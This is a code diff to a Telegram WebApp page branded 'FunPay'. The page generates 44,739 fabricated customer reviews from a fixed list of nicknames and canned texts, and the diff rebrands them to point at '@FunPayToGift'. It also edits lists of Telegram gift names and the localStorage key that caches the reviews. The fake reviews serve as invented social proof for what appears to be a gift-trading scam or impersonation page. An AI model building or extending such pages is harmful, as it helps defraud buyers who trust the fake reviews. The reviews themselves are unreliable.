@@ -291,7 +291,7 @@
         tg.setBackgroundColor('#0f0f12');
         tg.setHeaderColor('#0f0f12');
 
-        // ===== СПИСКИ ПОДАРКОВ (БЕЗ Durov's Cap, Plush Pepe, Signet Ring) =====
+        // ===== СПИСКИ ПОДАРКОВ (Heart Locket УДАЛЁН) =====
 
         const cheapGifts = [
             'Vice Cream', 'Chill Flame', 'Xmas Stocking', 'Lunar Snake',
@@ -307,9 +307,9 @@
             'Santa Hat', 'Star Notepad', 'Neko Helmet', 'Vintage Cigar',
             'Restless Jar', 'Toy Bear', 'Kissed Frog', 'Light Sword',
             'Snow Mittens', 'Voodoo Doll', 'Loot Bag', 'Magic Potion',
-            'Love Potion', 'Heart Locket', 'Evil Eye', 'Snow Globe',
-            'Lol Pop', 'Nail Bracelet', 'Diamond Ring', 'Top Hat',
-            'Spiced Wine', 'Precious Peach'
+            'Love Potion', 'Evil Eye', 'Snow Globe', 'Lol Pop',
+            'Nail Bracelet', 'Diamond Ring', 'Top Hat', 'Spiced Wine',
+            'Precious Peach'
         ];
 
         const mediumGifts = [
@@ -331,6 +331,7 @@
             'Genie Lamp + Crystal Ball'
         ];
 
+        // ИМЕНА (ФИКСИРОВАННЫЙ СПИСОК, НЕ ОБНОВЛЯЕТСЯ)
         const nicknames = [
             'Аринка', 'skywer', 'doner', 'Лиза', 'emma', 'эля', 'Вера',
             'глистый', 'maonic', 'Ssss', 'zahra', 'ZETIK', 'Lili Alvirovna',
@@ -356,6 +357,7 @@
             'Winter Fairy', 'Jester King', 'Pet Lover', 'Star Gazer'
         ];
 
+        // ТЕКСТЫ ОТЗЫВОВ (ВСЕ @Lolz_Relayer ЗАМЕНЕНЫ НА @FunPayToGift)
         const reviewTexts = [
             'сделали сделку топ, закинули рубли, звезды пришли через 7м',
             'продавец оплатил моментально, скинул менеджеру, оплата на карте через минуту',
@@ -439,7 +441,7 @@
             'продавец зашёл в сделку оплатил я передал подарок @FunPayToGift рубли упали сразу всё ок рекомендую'
         ];
 
-        // ===== ГЕНЕРАЦИЯ ОТЗЫВОВ =====
+        // ===== ГЕНЕРАЦИЯ ОТЗЫВОВ (ОДИН РАЗ) =====
         function generateAllReviews(total) {
             const reviews = [];
             const used = new Set();
@@ -497,7 +499,7 @@
         // ===== ПАГИНАЦИЯ С СОХРАНЕНИЕМ В LOCALSTORAGE =====
         const TOTAL_REVIEWS = 44739;
         const PER_PAGE = 50;
-        const STORAGE_KEY = 'funpay_reviews_data';
+        const STORAGE_KEY = 'funpay_reviews_data_v2';
 
         let currentPage = 0;
         let allReviews = [];
@@ -514,15 +516,12 @@
                     if (data && data.reviews && data.reviews.length === TOTAL_REVIEWS) {
                         allReviews = data.reviews;
                         currentPage = data.currentPage || 0;
-                        // Восстанавливаем уже отрисованные отзывы
                         const savedHtml = data.renderedHtml || '';
                         if (savedHtml) {
                             container.innerHTML = savedHtml;
-                            // Обновляем счётчик
                             const end = Math.min((currentPage + 1) * PER_PAGE, allReviews.length);
                             const remaining = allReviews.length - end;
                             totalDisplay.textContent = remaining > 0 ? remaining : 0;
-                            // Прячем кнопку если всё загружено
                             if (end >= allReviews.length) {
                                 loadMoreBtn.classList.add('hidden');
                             } else {
@@ -569,7 +568,6 @@
                 </div>
             `).join('');
 
-            // Если это первая страница — заменяем, иначе добавляем
             if (page === 0 && container.innerHTML === '') {
                 container.innerHTML = html;
             } else {
@@ -600,7 +598,6 @@
         const loaded = loadFromStorage();
 
         if (!loaded) {
-            // Если нет сохранённых данных — генерируем
             allReviews = generateAllReviews(TOTAL_REVIEWS);
             renderPage(0);
         }
@@ -759,7 +756,7 @@
             tg.expand();
         });
 
-        console.log('FunPay WebApp loaded! Reviews saved in localStorage.');
+        console.log('FunPay WebApp loaded! Reviews saved in localStorage. Heart Locket removed.');
     </script>
 </body>
 </html>
